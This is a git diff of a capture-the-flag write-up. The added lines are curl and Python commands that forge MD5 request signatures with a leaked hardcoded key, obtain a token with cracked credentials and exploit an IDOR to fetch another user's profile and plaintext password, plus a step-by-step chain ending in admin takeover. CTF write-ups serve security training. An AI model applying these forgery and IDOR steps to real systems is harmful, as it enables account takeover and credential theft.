@@ -156,12 +156,20 @@ With the key recovered, the consultant could now sign any API request. Cracking 
 Calling `POST /api/alerts/` with a valid token returned flag 3.
 
 ```bash
-┌──(kali㉿kali)-[~]
-└─$ curl -s -X POST https://chortle.0hl.cc/api/alerts/ \
+┌──(kali㉿kali)-[~/Room410]
+└─$ BODY='{"username":"nikolai","password":"password123"}'
+SIG=$(python3 -c "import hashlib; KEY='Th1\$_1\$_mY_\$3Cr3t_3nCrYpt10N_k3Y'; print(hashlib.md5((KEY+'$BODY').encode()).hexdigest())")
+
+TOKEN=$(curl -s -X POST https://chortle.0hl.cc/api/token/ \
+  -H "Content-Type: application/json" \
+  -H "X-Signature: $SIG" \
+  -d "$BODY" | python3 -c "import sys,json; print(json.load(sys.stdin)['access'])")
+
+curl -s -X POST https://chortle.0hl.cc/api/alerts/ \
   -H "X-Signature: be35213f5990a7778a73ad1ca69e76ec" \
   -H "Authorization: Bearer $TOKEN" \
   -H "Content-Length: 0"
-[{"id":"a53e8b0c-...","message":"PRJBLK{3/6:_Ye@H,_w3_@lr3ady_Kn3w_@b0ut_Th@t_cr1t1c@1_I$$u3}"}]
+[{"id":"a53e8b0c-4de5-4ec3-b3fe-c661724f38f5","message":"PRJBLK{3/6:_Ye@H,_w3_@lr3ady_Kn3w_@b0ut_Th@t_cr1t1c@1_I$$u3}"}] 
 ```
 
 ![image](/assets/img/pic3.jfif){: .mx-auto .shadow .rounded-10 w="800" }
@@ -177,24 +185,22 @@ Logged in as nikolai (USER privilege), the consultant observed the dashboard mak
 The consultant replaced nikolai's UUID with jason's (`c150138a-fb84-491b-8880-3a852326fcd7`) and recomputed the signature.
 
 ```bash
-┌──(kali㉿kali)-[~]
-└─$ python3 -c "
-import hashlib, json
-KEY = 'Th1\$_1\$_mY_\$3Cr3t_3nCrYpt10N_k3Y'
-body = json.dumps({'id':'c150138a-fb84-491b-8880-3a852326fcd7'}, separators=(',',':'))
-print(hashlib.md5((KEY+body).encode()).hexdigest())
-"
-90c7c8f5972b542ad1c32543daef66b3
+BODY='{"username":"nikolai","password":"password123"}'
+SIG=$(python3 -c "import hashlib; KEY='Th1\$_1\$_mY_\$3Cr3t_3nCrYpt10N_k3Y'; print(hashlib.md5((KEY+'$BODY').encode()).hexdigest())")
 
-┌──(kali㉿kali)-[~]
-└─$ curl -s -X POST https://chortle.0hl.cc/api/profile/ \
+TOKEN=$(curl -s -X POST https://chortle.0hl.cc/api/token/ \
+  -H "Content-Type: application/json" \
+  -H "X-Signature: $SIG" \
+  -d "$BODY" | python3 -c "import sys,json; print(json.load(sys.stdin)['access'])")
+
+echo "Token: $TOKEN"
+
+# Step 2 - IDOR with jason's ID
+curl -s -X POST https://chortle.0hl.cc/api/profile/ \
   -H "Content-Type: application/json" \
   -H "X-Signature: 90c7c8f5972b542ad1c32543daef66b3" \
   -H "Authorization: Bearer $TOKEN" \
   -d '{"id":"c150138a-fb84-491b-8880-3a852326fcd7"}'
-{"flag":"PRJBLK{4/6:_DEV3l0pEr_t00l$!?_Y0u_must_be_@_Ma$t3r_h@ck3r}",
- "data":{"id":"c150138a-...","email":"jason@localhost","username":"jason",
-         "privilege_level":"ADMIN","password":"kgf7ac69WDojJW5MNA2"}}
 ```
 
 The response returns jason's full profile including his **plaintext password** and flag 4.
@@ -282,17 +288,30 @@ curl -s https://chortle.0hl.cc/api/users/ \
 
 ## Attack Chain
 ```
-challenge6.txt (stego)
-    → flag.zip (password: gandalf) → Flag 1
-    → chortle.0hl.cc
-        → /api/users/ unauthenticated → Flag 2 (in mal's description)
-        → bundle.js hardcoded key → sign any request
-        → nikolai MD5 cracked → valid token
-        → /api/alerts/ → Flag 3
-        → IDOR /api/profile/ with jason's UUID → Flag 4 + jason's password
-        → login as jason → admin dashboard → Flag 5 + file.db download
-        → file.db → eddie's cleartext password
-        → login as eddie → /api/alerts/ → Flag 6
+challenge6.txt (MockingCase stego)
+    → binary bits → base64 → flag.zip
+    → crack ZIP (rockyou) → password: gandalf → Flag 1
+
+chortle.0hl.cc
+    → GET /api/users/ (no auth needed)
+    → leaks all UUIDs + MD5 hashes + Flag 2 in mal's description
+
+    → download bundle.js
+    → hardcoded signing key: Th1$_1$_mY_$3Cr3t_3nCrYpt10N_k3Y
+    → crack nikolai's MD5 → password123 → get Bearer token
+
+    → POST /api/alerts/ with valid token → Flag 3
+
+    → IDOR: swap own UUID → jason's UUID in /api/profile/ body
+    → server never checks ownership → jason's profile returned
+    → Flag 4 + jason's plaintext password
+
+    → login as jason (ADMIN) → dashboard → Flag 5 + download file.db
+
+    → file.db core_user table → clear_text_password column
+    → eddie (SUPER_ADMIN) password exposed
+
+    → login as eddie → POST /api/alerts/ → Flag 6
 ```
 
 ## All Flags
